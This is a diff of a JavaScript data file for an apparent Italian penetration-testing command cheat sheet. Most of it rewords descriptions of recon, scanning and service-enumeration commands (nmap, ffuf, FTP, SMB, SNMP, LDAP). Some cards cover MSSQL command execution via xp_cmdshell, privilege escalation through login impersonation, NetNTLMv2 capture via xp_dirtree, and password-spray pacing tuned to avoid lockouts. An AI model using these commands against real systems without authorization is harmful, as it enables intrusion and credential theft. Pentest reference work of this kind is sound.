@@ -1,4 +1,4 @@
-/* data.js — generato da Command Manager il 2026-07-13T15:34:50.005Z */
+/* data.js — generato da WannaHack il 2026-08-03T13:34:28.980Z */
 const COMMANDS = [
   {
     "id": "whois-domain",
@@ -143,7 +143,7 @@ const COMMANDS = [
         "id": "any",
         "label": "ANY (spesso rifiutato)",
         "template": "dig any <domain> @1.1.1.1",
-        "description": "Query ANY: spesso rifiutata dai resolver moderni, tienila come fallback."
+        "description": "Query ANY: spesso rifiutata dai resolver moderni, resta utile solo come fallback."
       }
     ],
     "refs": [
@@ -237,7 +237,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "passive-recon",
     "group": "Subdomain Enum",
-    "description": "Aggrega sottodomini da molte fonti passive. \n`-all` attiva tutte le fonti (più lento). Aggiungi le API key in `~/.config/subfinder/provider-config.yaml` per una copertura piena.",
+    "description": "Aggrega sottodomini da molte fonti passive.\n`-all` attiva tutte le fonti, al prezzo di una scansione più lenta. Le API key vanno configurate in `~/.config/subfinder/provider-config.yaml` per ottenere una copertura piena.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -307,7 +307,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "passive-recon",
     "group": "Subdomain Enum",
-    "description": "Raccolta di sottodomini veloce e leggera. Usalo insieme a subfinder/amass e unisci le liste.",
+    "description": "Raccolta di sottodomini veloce e leggera. Va usata insieme a subfinder e amass, unendo poi le liste.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -649,7 +649,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "passive-recon",
     "group": "Google Dorks",
-    "description": "Prova questi dork uno alla volta contro il dominio. I documenti pubblici perdono metadati (nomi utente, software usato); il dork `index of` espone le directory aperte; quelli su config e password trovano segreti trapelati.",
+    "description": "Dork da provare uno alla volta contro il dominio. I documenti pubblici perdono metadati come nomi utente e software in uso, il dork `index of` espone le directory aperte, e quelli su config e password fanno emergere segreti trapelati.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -674,7 +674,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Documenti",
         "template": "site:<domain> (filetype:pdf OR filetype:xlsx OR filetype:docx)",
-        "description": "Documenti pubblici (`pdf`, `xlsx`, `docx`): dai loro metadati ricavi nomi utente, software e path interni."
+        "description": "Documenti pubblici (`pdf`, `xlsx`, `docx`): dai loro metadati si ricavano nomi utente, software e path interni."
       },
       {
         "id": "login",
@@ -767,7 +767,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "TCP Scans",
-    "description": "Misura la latenza (RTT) verso il target: decide quanto puoi spingere nmap senza perdere porte.\n- `< 30ms` → `--min-rate 5000 --max-retries 2`\n- `30–100ms` (VPN tipica) → `--min-rate 3000 --max-retries 3`\n- `> 100ms` o instabile → `--min-rate 1000 --max-retries 5`\nSe l’ICMP è bloccato, hping3 manda un SYN e ricava l’RTT dal RST.",
+    "description": "Misura la latenza (RTT) verso il target, che determina quanto si può spingere nmap senza perdere porte.\n- `< 30ms` → `--min-rate 5000 --max-retries 2`\n- `30–100ms` (VPN tipica) → `--min-rate 3000 --max-retries 3`\n- `> 100ms` o instabile → `--min-rate 1000 --max-retries 5`\nSe l'ICMP è bloccato, hping3 manda un SYN e ricava l'RTT dal RST.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -855,7 +855,7 @@ const COMMANDS = [
         "id": "pn",
         "label": "-Pn (no ping)",
         "template": "sudo nmap -sC -sV -O -Pn --open -oA nmap/quick <ip>",
-        "description": "Salta l’host discovery: usalo se l’host blocca l’ICMP e nmap lo segna “down”."
+        "description": "Salta l'host discovery. Serve quando l'host blocca l'ICMP e nmap lo segna come “down”."
       }
     ],
     "refs": [
@@ -971,7 +971,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "TCP Scans",
-    "description": "Lancia gli script NSE della categoria `vuln` sulle porte note: check rapido di vulnerabilità conosciute. Rumoroso, evitalo dove serve discrezione.",
+    "description": "Lancia gli script NSE della categoria `vuln` sulle porte note, per un check rapido di vulnerabilità conosciute. È rumoroso, quindi va evitato dove serve discrezione.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1059,7 +1059,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "UDP Scans",
-    "description": "Scanner UDP asincrono: invia i probe e riceve le risposte in parallelo, quindi copre tutte le 65535 porte molto più in fretta di `nmap -sU`.\n- `-m U` = modalità UDP\n- `-Iv` = output immediato e verboso\n- `-r 5000` = pacchetti al secondo\n\nServe root (raw socket). Usalo per un primo sweep UDP completo, poi conferma le porte trovate con `nmap -sU -sV`.",
+    "description": "Scanner UDP asincrono: invia i probe e riceve le risposte in parallelo, quindi copre tutte le 65535 porte molto più in fretta di `nmap -sU`.\n- `-m U` = modalità UDP\n- `-Iv` = output immediato e verboso\n- `-r 5000` = pacchetti al secondo\n\nRichiede root per i raw socket. È adatto a un primo sweep UDP completo, con le porte trovate poi confermate da `nmap -sU -sV`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1120,7 +1120,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Ping sweep",
         "template": "sudo nmap -sn <subnet> -oA nmap/ping_sweep",
-        "description": "Probe di default (`-sn`): ARP in LAN, altrimenti ICMP echo + TCP ACK 80 + ICMP timestamp. Estrai i vivi in `live_hosts.txt`."
+        "description": "Probe di default (`-sn`): ARP in LAN, altrimenti ICMP echo più TCP ACK 80 e ICMP timestamp. Gli host vivi finiscono in `live_hosts.txt`."
       },
       {
         "id": "arp",
@@ -1150,7 +1150,7 @@ const COMMANDS = [
         "id": "tcp-ack",
         "label": "TCP ACK ping",
         "template": "sudo nmap -sn -PA80,443 <subnet> -oA nmap/ping_sweep",
-        "description": "ACK ping (`-PA`): attraversa i firewall stateless. Combinalo col SYN ping per coprire più casi."
+        "description": "ACK ping (`-PA`): attraversa i firewall stateless. Va combinato con il SYN ping per coprire più casi."
       },
       {
         "id": "udp",
@@ -1296,7 +1296,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Directory Fuzzing",
-    "description": "Bruteforce di file e directory web con SecLists. Scegli le estensioni in base allo stack rilevato (`.php`, `.aspx`…).\n- `-fc` = filtra per status code\n- `-fs` = filtra per dimensione risposta",
+    "description": "Bruteforce di file e directory web con SecLists. Le estensioni si scelgono in base allo stack rilevato, per esempio `.php` o `.aspx`.\n- `-fc` = filtra per status code\n- `-fs` = filtra per dimensione risposta",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1361,7 +1361,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Directory Fuzzing",
-    "description": "Alternativa a ffuf per il dir busting. Comodo per confrontare i risultati quando ffuf dà falsi positivi.\n- `-t` = numero di thread\n- `-x` = estensioni da cercare, aggiungilo tu se vuoi i file (es. `php,html,txt,bak`)",
+    "description": "Alternativa a ffuf per il dir busting. Comoda per confrontare i risultati quando ffuf produce falsi positivi.\n- `-t` = numero di thread\n- `-x` = estensioni da cercare, da aggiungere manualmente per includere i file, per esempio `php,html,txt,bak`",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1486,7 +1486,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Fingerprinting",
-    "description": "Identifica tecnologie, CMS, framework e versioni di un web server. `-a 3` = aggressività massima (più richieste, più dettagli). Lancialo su ogni web server prima del fuzzing.",
+    "description": "Identifica tecnologie, CMS, framework e versioni di un web server. `-a 3` è l'aggressività massima, con più richieste e più dettagli. Va lanciato su ogni web server prima del fuzzing.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1520,7 +1520,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Fingerprinting",
-    "description": "Screenshot di tutte le URL di una lista: triage veloce di una superficie web ampia (capisci a colpo d’occhio quali app valgono). Genera un report HTML.",
+    "description": "Screenshot di tutte le URL di una lista, per il triage veloce di una superficie web ampia: da un colpo d'occhio si capisce quali applicazioni meritano attenzione. Genera un report HTML.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1580,7 +1580,7 @@ const COMMANDS = [
         "id": "resolver",
         "label": "Resolver di default",
         "template": "dig -x <ip>",
-        "description": "Usa il resolver della tua macchina: trova il PTR registrato sul DNS pubblico del provider."
+        "description": "Interroga il resolver locale della macchina e trova il PTR registrato sul DNS pubblico del provider."
       },
       {
         "id": "nslookup",
@@ -1603,7 +1603,7 @@ const COMMANDS = [
     "category": "info-gathering",
     "subcategory": "active-recon",
     "group": "Zone Transfer",
-    "description": "Tenta un trasferimento di zona completo: un DNS mal configurato consegna TUTTI i record (sottodomini, IP interni) in un colpo. Prova ogni nameserver trovato con `dig ns`.",
+    "description": "Tenta un trasferimento di zona completo: un DNS mal configurato consegna tutti i record in un colpo solo, sottodomini e IP interni compresi. Va tentato su ogni nameserver restituito da `dig ns`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1758,7 +1758,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "ftp",
     "group": "Anonymous Access",
-    "description": "Prova l’accesso anonimo: utente anonymous, password vuota o una email qualsiasi.",
+    "description": "L'accesso anonimo si prova con utente anonymous e password vuota oppure una email qualsiasi.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -1810,12 +1810,12 @@ const COMMANDS = [
     ]
   },
   {
-    "id": "ftp-wget",
-    "name": "wget — download FTP",
+    "id": "ftp-lftp-access",
+    "name": "lftp — accesso interattivo",
     "category": "service-enum",
     "subcategory": "ftp",
     "group": "Pillaging",
-    "description": "Download ricorsivo di tutti i file via FTP anonimo (mirror). `--no-passive` forza la modalità active.",
+    "description": "Apre una sessione lftp interattiva per sfogliare il server prima di scaricare. Dentro la shell usi `ls`, `cd`, poi `get <file>`, `mget *.conf` (glob) o `mirror <dir_remota> <dir_locale>` per il ricorsivo.\n- `-u anonymous,` = login anonimo, password vuota (occhio alla virgola)\n- `-u <user>,<pass>` = login autenticato\n- Per scaricare tutto in un colpo senza entrare nella shell usa la card **lftp — download FTP**.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -1824,19 +1824,51 @@ const COMMANDS = [
       "ftp"
     ],
     "tags": [
-      "wget",
+      "lftp",
       "ftp",
-      "download"
+      "interattivo",
+      "shell"
     ],
-    "template": "wget -m --no-passive ftp://anonymous:@<ip>",
+    "template": "lftp -u anonymous, <ip>",
     "params": [
       {
         "key": "ip",
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "Utente",
+        "placeholder": "ftpuser"
+      },
+      {
+        "key": "pass",
+        "label": "Password",
+        "placeholder": "password"
       }
-    ]
+    ],
+    "variants": [
+      {
+        "id": "anon",
+        "label": "Accesso anonimo",
+        "template": "lftp -u anonymous, <ip>",
+        "description": "Apre una sessione lftp interattiva in anonimo. Dentro usi `ls`, `cd`, `get`, `mget` e `mirror` (ricorsivo)."
+      },
+      {
+        "id": "creds",
+        "label": "Accesso con cred",
+        "template": "lftp -u <user>,<pass> <ip>",
+        "description": "Sessione lftp interattiva autenticata. Stessi comandi interni; `mirror <dir> .` per scaricare ricorsivamente."
+      }
+    ],
+    "refs": [
+      {
+        "label": "lftp — Kali Tools",
+        "url": "https://www.kali.org/tools/lftp/"
+      }
+    ],
+    "note": "# Scaricare file dalla sessione\nDentro la shell di lftp lancia `mirror <dir_remota> <dir_locale>` per il ricorsivo, `mget *.conf` per i glob, `get file` per uno solo."
   },
   {
     "id": "ftp-lftp",
@@ -1912,18 +1944,6 @@ const COMMANDS = [
         "label": "Mirror con cred",
         "template": "lftp -u <user>,<pass> <ip> -e \"mirror / ./ftp_loot; bye\"",
         "description": "Come il mirror completo ma con login autenticato invece che anonimo."
-      },
-      {
-        "id": "access-anon",
-        "label": "Accesso anonimo",
-        "template": "lftp -u anonymous, <ip>",
-        "description": "Apre una sessione lftp interattiva in anonimo. Dentro usi `ls`, `cd`, `get`, `mget` e `mirror` (ricorsivo)."
-      },
-      {
-        "id": "access-creds",
-        "label": "Accesso con cred",
-        "template": "lftp -u <user>,<pass> <ip>",
-        "description": "Sessione lftp interattiva autenticata. Stessi comandi interni; `mirror <dir> .` per scaricare ricorsivamente."
       }
     ],
     "refs": [
@@ -1932,7 +1952,36 @@ const COMMANDS = [
         "url": "https://www.kali.org/tools/lftp/"
       }
     ],
-    "note": "# Scaricare file dalla sessione\nDentro la shell di lftp lancia `mirror <dir_remota> <dir_locale>` per il ricorsivo, `mget *.conf` per i glob, `get file` per uno solo."
+    "note": "# Download in blocco\n- `mirror` è già non interattivo: nessun `prompt off` da dare.\n- `--include-glob` / `--exclude-glob` per filtrare, `--parallel=N` per più trasferimenti insieme.\n- Per sfogliare il server a mano prima di scaricare usa la card **lftp — accesso interattivo**."
+  },
+  {
+    "id": "ftp-wget",
+    "name": "wget — download FTP",
+    "category": "service-enum",
+    "subcategory": "ftp",
+    "group": "Pillaging",
+    "description": "Download ricorsivo di tutti i file via FTP anonimo (mirror). `--no-passive` forza la modalità active.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "ftp"
+    ],
+    "tags": [
+      "wget",
+      "ftp",
+      "download"
+    ],
+    "template": "wget -m --no-passive ftp://anonymous:@<ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ]
   },
   {
     "id": "ssh-connect",
@@ -2017,7 +2066,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "ssh",
     "group": "File Transfer",
-    "description": "Copia file sul canale cifrato SSH. La direzione dipende da dove metti `<user>@<ip>:` (sorgente o destinazione).\n- `-r` = ricorsivo, intere cartelle\n- `-P <port>` = porta SSH non standard (P maiuscola, diversa da ssh)\n- `-i <key>` = usa una chiave privata",
+    "description": "Copia file sul canale cifrato SSH. La direzione dipende da quale lato porta `<user>@<ip>:`, se la sorgente o la destinazione.\n- `-r` = ricorsivo, intere cartelle\n- `-P <port>` = porta SSH non standard, con la P maiuscola a differenza di ssh\n- `-i <key>` = usa una chiave privata",
     "platform": "cross-platform",
     "requires": [
       "creds"
@@ -2327,7 +2376,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "smb",
     "group": "Null Session",
-    "description": "Prova sempre la null session per prima: share guest/anonime sono sorprendentemente comuni.",
+    "description": "La null session va provata sempre per prima: share guest e anonime sono sorprendentemente comuni.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -2395,7 +2444,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "smb",
     "group": "Null Session",
-    "description": "Apre una share per navigarla (`ls`, `cd`, `get`, `mget`). Prova prima l'accesso anonimo, poi con le credenziali trovate.\n- `-N` = null session, niente password\n- `-U '<user>%<password>'` = login autenticato\n- `-c '...'` = esegue comandi senza entrare nella shell",
+    "description": "Apre una share per navigarla con `ls`, `cd`, `get` e `mget`. Conviene tentare prima l'accesso anonimo e poi quello con le credenziali trovate.\n- `-N` = null session, niente password\n- `-U '<user>%<password>'` = login autenticato\n- `-c '...'` = esegue comandi senza entrare nella shell",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -2719,7 +2768,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "smb",
     "group": "Authenticated Enum",
-    "description": "Controlla la soglia di lockout PRIMA di lanciare un password spray.",
+    "description": "La password policy va letta prima di qualsiasi spray, perché un solo giro di troppo blocca gli account e brucia l'accesso. L'output riporta la soglia di lockout, la durata del blocco e la finestra di osservazione. Con soglia maggiore di zero la regola è un solo tentativo per finestra, distribuito su molti utenti.",
     "platform": "linux",
     "requires": [
       "password"
@@ -3050,8 +3099,13 @@ const COMMANDS = [
       "onesixtyone",
       "snmp"
     ],
-    "template": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <ip>",
+    "template": "onesixtyone -c <wordlist> <ip>",
     "params": [
+      {
+        "key": "wordlist",
+        "label": "Wordlist",
+        "placeholder": "/usr/share/wordlists-custom/SecLists-2026.1/Discovery/SNMP/snmp.txt"
+      },
       {
         "key": "ip",
         "label": "Target",
@@ -3066,7 +3120,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "snmp",
     "group": "Enumeration",
-    "description": "Scarica l'intero albero MIB (`.1`) via SNMP con una community valida. Ne escono utenti, processi, software installato, interfacce di rete, route e a volte credenziali in chiaro.\n- `-c <community>` = community string, funziona come una password (prova `public`/`private`)\n- `-v2c` = versione SNMP v2c",
+    "description": "Scarica l'intero albero MIB (`.1`) via SNMP con una community valida. Ne escono utenti, processi, software installato, interfacce di rete, route e a volte credenziali in chiaro.\n- `-c <community>` = community string, funziona come una password: `public` e `private` sono i primi valori da tentare\n- `-v2c` = versione SNMP v2c",
     "platform": "linux",
     "requires": [
       "password"
@@ -3125,7 +3179,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "smtp",
     "group": "User Enumeration",
-    "description": "Enumera utenti validi via comandi VRFY/EXPN/RCPT TO. Scegli il metodo in base a cosa il server lascia aperto.",
+    "description": "Enumera utenti validi tramite i comandi VRFY, EXPN e RCPT TO. Il metodo si sceglie in base a quale dei tre il server lascia aperto.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -3212,7 +3266,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "nfs",
     "group": "Mounting",
-    "description": "Monta una share NFS in locale (crea prima `/mnt/nfs`). Cerca file con `UID` che puoi impersonare.",
+    "description": "Monta una share NFS in locale, previa creazione di `/mnt/nfs`. I file interessanti sono quelli con un `UID` impersonabile.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -3245,7 +3299,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "ldap",
     "group": "Anonymous",
-    "description": "Bind LDAP anonimo: spesso espone l’intera directory AD. Parti dai `namingContexts` per scoprire il `Base DN`.",
+    "description": "Bind LDAP anonimo, che spesso espone l'intera directory AD. Il punto di partenza sono i `namingContexts`, da cui si ricava il Base DN.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -3343,7 +3397,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mssql",
     "group": "Connection",
-    "description": "Connessione via TDS. Usa `-windows-auth` per i login di dominio (Windows auth).",
+    "description": "Connessione a MSSQL via TDS. Esistono due modi di login: **SQL auth**, con account interni al database come `sa`, e **Windows auth**, con account di dominio via NTLM. La variante va scelta di conseguenza.",
     "platform": "linux",
     "requires": [
       "password"
@@ -3355,7 +3409,7 @@ const COMMANDS = [
       "impacket",
       "mssql"
     ],
-    "template": "impacket-mssqlclient <user>:<password>@<ip> -windows-auth",
+    "template": "impacket-mssqlclient <user>:<password>@<ip>",
     "params": [
       {
         "key": "user",
@@ -3374,6 +3428,26 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "domain",
+        "label": "Domain",
+        "ctx": "domain",
+        "placeholder": "corp.local"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "SQL auth",
+        "template": "impacket-mssqlclient <user>:<password>@<ip>",
+        "description": "Autenticazione **SQL Server**: `<user>` è un login interno al DB (tipico `sa`). Niente `-windows-auth` → le credenziali NON sono di dominio."
+      },
+      {
+        "id": "windows-auth",
+        "label": "Windows auth",
+        "template": "impacket-mssqlclient <domain>/<user>:<password>@<ip> -windows-auth",
+        "description": "Autenticazione **Windows/AD** via NTLM. `-windows-auth` impone l'uso dell'account di dominio `<domain>/<user>` invece di un login SQL. Per un account locale della macchina il dominio va valorizzato con il nome host oppure con `.`."
       }
     ]
   },
@@ -3383,7 +3457,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mssql",
     "group": "Enumeration",
-    "description": "Dentro la sessione MSSQL, capisci cosa puoi fare prima di attaccare. `IS_SRVROLEMEMBER('sysadmin')` torna `1` se sei sysadmin (xp_cmdshell diretto), `0` se no (serve un altro vettore, es. impersonation). L'ultima query elenca i login che puoi impersonare.",
+    "description": "Dentro la sessione MSSQL serve a capire quali azioni sono possibili prima di attaccare. `IS_SRVROLEMEMBER('sysadmin')` torna `1` con il ruolo sysadmin attivo, che consente xp_cmdshell diretto, e `0` altrimenti, caso in cui serve un altro vettore come l'impersonation. L'ultima query elenca i login impersonabili.",
     "platform": "cross-platform",
     "requires": [
       "password"
@@ -3404,19 +3478,19 @@ const COMMANDS = [
         "id": "sysadmin",
         "label": "Sei sysadmin?",
         "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
-        "description": "`1` = sei sysadmin (xp_cmdshell diretto), `0` = no, `NULL` = nome ruolo scritto male."
+        "description": "`1` indica ruolo sysadmin attivo e quindi xp_cmdshell diretto, `0` il contrario, `NULL` un nome di ruolo scritto male."
       },
       {
         "id": "whoami",
         "label": "Identità corrente",
         "template": "SELECT SYSTEM_USER AS login, USER_NAME() AS db_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;",
-        "description": "Login attuale, utente nel database e se sei sysadmin, in una riga."
+        "description": "Login corrente, utente nel database e presenza del ruolo sysadmin, in una sola riga."
       },
       {
         "id": "impersonate",
         "label": "Chi posso impersonare",
         "template": "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
-        "description": "Login su cui hai il permesso `IMPERSONATE`. Se compare `sa` o un sysadmin, puoi salire con `EXECUTE AS LOGIN`."
+        "description": "Login su cui è concesso il permesso `IMPERSONATE`. La comparsa di `sa` o di un sysadmin apre la scalata con `EXECUTE AS LOGIN`."
       }
     ],
     "refs": [
@@ -3432,7 +3506,8 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mssql",
     "group": "Exploitation",
-    "description": "Abilita e invoca `xp_cmdshell` per RCE come account del servizio SQL.",
+    "description": "`xp_cmdshell` esegue comandi del sistema operativo con i privilegi dell'account di servizio SQL, che spesso è un account di dominio. È disabilitato di default e va riattivato con `sp_configure`, operazione che richiede il ruolo sysadmin. L'output del comando torna nella griglia dei risultati.",
+    "note": "# Se la riconfigurazione fallisce\nIl messaggio `SQL Server blocked access to procedure 'sys.xp_cmdshell'` indica che l'utente non è sysadmin. In quel caso la via è l'impersonation di un login sysadmin, oppure la cattura del NetNTLMv2 con `xp_dirtree` verso una share controllata.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -3460,7 +3535,8 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mssql",
     "group": "Exploitation",
-    "description": "Priv esc via grant `IMPERSONATE` (non serve essere `sysadmin`).",
+    "description": "La scalata di privilegi in MSSQL non richiede per forza il ruolo sysadmin: se un login di basso privilegio ha il permesso `IMPERSONATE` su un altro, può assumerne l'identità con `EXECUTE AS LOGIN`. Impersonando `sa` o un qualsiasi sysadmin si arriva comunque a xp_cmdshell. I login impersonabili si individuano con la query dedicata nella scheda dei ruoli.",
+    "note": "# Ritorno all'identità originale\nDopo `EXECUTE AS LOGIN = 'sa'` il contesto resta cambiato per tutta la sessione: `REVERT` riporta al login di partenza. `SELECT SYSTEM_USER` conferma in ogni momento chi si è.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -3515,7 +3591,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "winrm",
     "group": "Shell",
-    "description": "Shell PowerShell interattiva su WinRM. Auth con password / hash / ticket.",
+    "description": "Shell PowerShell interattiva su WinRM, il protocollo di gestione remota di Windows sulle porte 5985 e 5986. È il metodo più pulito quando l'account appartiene al gruppo Remote Management Users, perché non crea servizi né scrive file sul target. L'autenticazione accetta password, hash NTLM per il Pass-the-Hash oppure ticket Kerberos.",
     "platform": "linux",
     "requires": [
       "password",
@@ -3670,7 +3746,7 @@ const COMMANDS = [
         "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /drive:share,/tmp/share /clipboard /dynamic-resolution"
       }
     ],
-    "note": "# Cos'è NLA\nNLA (Network Level Authentication) ti fa autenticare PRIMA che si apra la sessione RDP.\n- Attivo = meglio: nessuna schermata di login per chi non ha credenziali valide, e blocca gli exploit pre-auth (es. BlueKeep).\n- Disabilitato = peggio: chiunque arriva alla schermata di login e i vecchi exploit pre-auth tornano sfruttabili.\n# NTLM o Kerberos?\nNLA (`/sec:nla`) usa CredSSP: prova prima Kerberos, se non ottiene un ticket ripiega su NTLM.\n- NTLM: connetti per IP con `/u /p` (o `/pth:<hash>`); funziona anche senza DC.\n- Kerberos: serve un TGT nel ccache (`export KRB5CCNAME=user.ccache`), l'FQDN del target (non l'IP) e un DC raggiungibile. Obbligatorio se sul target NTLM è disabilitato.\n# Capire cosa vuole il target\n- `nxc rdp <ip>` oppure `nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>`: dicono se l'NLA è richiesto e mostrano FQDN e dominio (ti servono per Kerberos).\n- Se l'auth NTLM fallisce con NLA attivo, il target vuole Kerberos: procurati un TGT e riprova con l'FQDN.\n# I livelli /sec\n- `/sec:nla` = CredSSP (Kerberos/NTLM), default moderno\n- `/sec:tls` = solo TLS, senza mutua auth CredSSP\n- `/sec:rdp` = Standard RDP Security legacy (debole), quando l'NLA è off"
+    "note": "# Cos'è NLA\nNLA (Network Level Authentication) impone l'autenticazione PRIMA che si apra la sessione RDP.\n- Attivo = meglio: nessuna schermata di login per chi non ha credenziali valide, e blocca gli exploit pre-auth come BlueKeep.\n- Disabilitato = peggio: chiunque raggiunge la schermata di login e i vecchi exploit pre-auth tornano sfruttabili.\n# NTLM o Kerberos?\nNLA (`/sec:nla`) usa CredSSP: tenta prima Kerberos e, senza ticket, ripiega su NTLM.\n- NTLM: connessione per IP con `/u /p` oppure `/pth:<hash>`, funziona anche senza DC.\n- Kerberos: richiede un TGT nel ccache (`export KRB5CCNAME=user.ccache`), l'FQDN del target al posto dell'IP e un DC raggiungibile. Obbligatorio quando sul target NTLM è disabilitato.\n# Capire cosa richiede il target\n- `nxc rdp <ip>` oppure `nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>` dicono se l'NLA è richiesto e mostrano FQDN e dominio, entrambi necessari per Kerberos.\n- Se l'auth NTLM fallisce con NLA attivo, il target vuole Kerberos: serve un TGT e un nuovo tentativo con l'FQDN.\n# I livelli /sec\n- `/sec:nla` = CredSSP (Kerberos/NTLM), default moderno\n- `/sec:tls` = solo TLS, senza mutua auth CredSSP\n- `/sec:rdp` = Standard RDP Security legacy e debole, quando l'NLA è disattivo"
   },
   {
     "id": "snmpbulkwalk",
@@ -3915,7 +3991,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "dns-svc",
     "group": "Zone Transfer",
-    "description": "Tenta il trasferimento di zona: se il server lo consente ottieni tutti i record del dominio in un colpo.",
+    "description": "Tenta il trasferimento di zona: se il server lo consente restituisce tutti i record del dominio in un colpo solo.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -4375,7 +4451,7 @@ const COMMANDS = [
         "id": "exec",
         "label": "Comando OS",
         "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth -x 'whoami'",
-        "description": "Esegue un comando OS via `xp_cmdshell` (lo abilita al volo se hai i privilegi)."
+        "description": "Esegue un comando OS via `xp_cmdshell`, abilitandolo al volo se i privilegi lo consentono."
       }
     ],
     "refs": [
@@ -4419,7 +4495,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mssql",
     "group": "Exploitation",
-    "description": "Forza il servizio SQL a raggiungere una share UNC tua per catturare il NetNTLMv2 con Responder (poi crack o relay). Funziona anche senza privilegi elevati.",
+    "description": "Forza il servizio SQL a raggiungere una share UNC controllata dall'attaccante per catturare il NetNTLMv2 con Responder, da craccare o rilanciare in relay. Funziona anche senza privilegi elevati.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -4490,7 +4566,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mysql",
     "group": "Connection",
-    "description": "Connessione al database. Prova prima `root` con password vuota o credenziali deboli/di default.",
+    "description": "Connessione al database MySQL. I primi tentativi sensati sono `root` con password vuota e le credenziali deboli o di default, perché su installazioni non irrobustite compaiono di frequente. La sessione ottenuta è il punto di partenza per la verifica dei prerequisiti RCE.",
     "platform": "linux",
     "requires": [
       "password"
@@ -4606,7 +4682,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mysql",
     "group": "Exploitation",
-    "description": "Prima di provare la RCE, verifica se è fattibile: MySQL non ha un `xp_cmdshell` pronto, serve il privilegio `FILE` e `secure_file_priv` non bloccato.\n- `secure_file_priv` = `''` (vuoto) scrivi file ovunque · `/path` solo lì · `NULL` scrittura file disabilitata (RCE morta)\n- serve `FILE` nei tuoi grant\n- `plugin_dir` = dove va la libreria per la via UDF",
+    "description": "Prima di tentare la RCE serve verificarne la fattibilità: MySQL non ha un `xp_cmdshell` pronto, quindi occorrono il privilegio `FILE` e un `secure_file_priv` non bloccato.\n- `secure_file_priv` = `''` (vuoto) consente la scrittura ovunque · `/path` la limita a quella directory · `NULL` la disabilita, e la RCE via file cade\n- il privilegio `FILE` deve comparire nei grant\n- `plugin_dir` indica dove va collocata la libreria per la via UDF",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -4627,13 +4703,13 @@ const COMMANDS = [
         "id": "default",
         "label": "secure_file_priv + plugin_dir",
         "template": "SELECT @@secure_file_priv, @@plugin_dir, @@version_compile_os;",
